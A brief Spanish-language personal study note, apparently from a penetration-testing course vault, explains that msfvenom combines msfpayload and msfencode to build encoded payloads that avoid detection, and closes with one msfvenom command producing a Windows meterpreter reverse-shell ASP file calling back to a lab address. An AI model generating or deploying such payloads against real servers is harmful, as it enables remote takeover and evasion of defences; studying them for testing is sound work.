junta las herramientas de msfpayload y msfencode que son de la familia [[Anotaciones/Herramientas/Metasploit]]
nos permite crear un codigo malicioso para ejecutarlo y este esta codificado para que no sea detectado

mas ejemplos: [[Exploiting WebDAV With Metasploit]]
[[1. Generating Payloads With Msfvenom]]
[[2. Encoding Payloads With Msfvenom]]


---
devolver una revershell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.18.2 LPORT=4444 -f asp > shell.asp
```